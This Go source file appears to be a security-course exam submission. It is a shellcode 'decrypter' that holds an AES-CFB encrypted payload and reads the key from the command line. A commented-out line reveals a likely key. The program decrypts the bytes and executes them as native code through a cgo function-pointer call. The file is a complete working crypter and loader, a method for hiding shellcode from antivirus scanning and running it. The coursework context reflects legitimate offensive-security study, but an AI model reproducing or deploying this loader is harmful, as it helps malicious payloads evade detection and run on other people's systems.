// SLAE Exam Assignment #7: Shellcode Decrpyter
// Author: Rikih Gunawan

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"os"
	"unsafe"
)

/*
#include<stdio.h>
#include<string.h>

void run_shellcode(char *code)
{
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"

func main() {

	encShellcode := []byte{
		0x17, 0xdc, 0x65, 0xe5, 0x7b, 0xcf, 0x23, 0xee, 0xfa, 0xb2, 0xb5, 0x80,
		0x88, 0x6b, 0x47, 0xd5, 0x46, 0x3c, 0xbc, 0xe8, 0x1a, 0xd0, 0x39, 0xac,
		0x41, 0x1f, 0xa8, 0xfa, 0xf4, 0xc5, 0xb4, 0x99, 0x1f, 0x9d, 0xda, 0x91,
		0x42, 0x1b, 0xb1, 0x7a, 0x8e, 0x52, 0x50, 0xc2, 0xf6, 0xcc, 0xf3, 0xef,
		0xb5, 0xb2, 0x18, 0x1a, 0x20, 0x66, 0x2b, 0x77, 0xd5, 0x63, 0x8, 0x5,
		0xee, 0xb8, 0xde, 0x4d, 0xd5, 0x5a, 0x7e, 0xd7, 0x68, 0x24, 0x61, 0x8,
		0x44, 0x4d, 0x2, 0x2c, 0xda, 0x50, 0xb4, 0x55, 0x1, 0xa9, 0x3e, 0x99,
		0xd8, 0xfa, 0x39, 0xa6, 0x9b, 0xc9, 0x1f, 0xcd, 0x13, 0xb9, 0xd6, 0x5b,
		0x26, 0x15, 0xbd, 0xd4, 0x80, 0x47, 0x11, 0x4, 0x55, 0xf9, 0xde, 0xa4,
		0x7, 0xd9, 0x4f, 0x2b, 0x9f, 0x51, 0xac, 0x9, 0x91, 0xd2, 0x56, 0x53,
	}

	encShellcodeStr := hex.EncodeToString(encShellcode)

	if len(os.Args[1]) != 16 {
		fmt.Println("ERROR: Key must be 16 chars")
		os.Exit(1)
	}
	//key := []byte("deadbeefdeafface")
	key := []byte(os.Args[1])

	fmt.Printf("[*] Encrypted shellcode:\n")
	for x, element := range encShellcodeStr {
		if x == len(encShellcodeStr)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n")

	fmt.Printf("[x] Key:\n%s\n\n", key)

	// decrypt
	decryptText := decrypt(key, encShellcodeStr)
	fmt.Printf("[*] Decrypted shellcode:\n")
	for x, element := range decryptText {
		if x == len(decryptText)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n[*] Executing shellcode..\n\n")

	C.run_shellcode((*C.char)(unsafe.Pointer(&decryptText[0])))

}

func decrypt(key []byte, text string) []byte {
	ctext, _ := hex.DecodeString(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	iv := ctext[:aes.BlockSize]
	ctext = ctext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ctext, ctext)

	return ctext
}
